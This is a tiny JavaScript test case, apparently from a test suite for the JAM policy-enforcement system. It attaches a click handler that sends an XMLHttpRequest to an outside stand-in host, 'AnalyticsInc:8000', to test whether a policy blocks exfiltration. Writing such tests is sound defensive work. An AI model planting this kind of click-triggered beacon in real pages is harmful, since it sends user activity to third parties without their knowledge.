// exfil_test_onclick3.js
function v0() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=onclick3", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
var v1 = document.getElementById("test");
JAM.call(v1.addEventListener, v1, ["click", v0, false], JAM.policy.p1)

